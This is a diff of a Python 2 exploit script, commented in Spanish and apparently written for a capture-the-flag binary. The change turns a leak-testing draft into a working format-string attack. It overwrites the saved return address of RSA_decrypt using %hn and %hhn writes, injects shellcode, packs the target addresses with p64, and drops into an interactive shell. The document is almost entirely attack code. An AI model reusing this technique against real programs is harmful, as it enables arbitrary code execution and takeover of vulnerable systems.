@@ -118,30 +118,28 @@ def main():
     ret_addr = stack_addr + 0x638 # de RSA_decrypt
     print 'ret_addr: ' + hex(ret_addr)
 
-    # en ret_addr sobreescribo 0x40140a por 0x602560
+    # en ret_addr sobreescribo 0x40140a por 0x602580
     payload  = ''
-    payload += '%37x' # 0x25
-    payload += '%79$p' # byte del medio
-    payload += '%59x' # 0x60
-    payload += '%87$p' # MSF
-    payload += '%50x'  # 50 porque si
-    payload += '%85$p' # LSB
+    payload += '%37x'  # 0x25
+    payload += '%70$hn' # byte del medio
+    payload += '%59x'  # 0x60
+    payload += '%71$hn' # MSF
+    payload += '%32x'  # 0x80
+    payload += '%69$hhn' # LSB
     pad = len(payload) % 8
     if pad > 0:
         payload += ' ' * (8 - pad)
 
-    payload += 'A' * 8
-    #payload += p64(ret_addr + 0) # LSB
-    payload += 'B' * 8
-    #payload += p64(ret_addr + 1)
-    payload += 'C' * 8
-    #payload += p64(ret_addr + 2) # MSB
+    payload += shellcode
 
-    #payload += shellcode
-    payload += 'Z' * len(shellcode)
+    payload  = encrypt(payload)[:-1]
 
-    print run(payload)
-    #interactive()
+    payload += p64(ret_addr + 0) # LSB
+    payload += p64(ret_addr + 1) # byte del medio
+    payload += p64(ret_addr + 2) # MSB
+
+    print decrypt(payload)
+    interactive()
 
 if __name__ == '__main__':
     try:
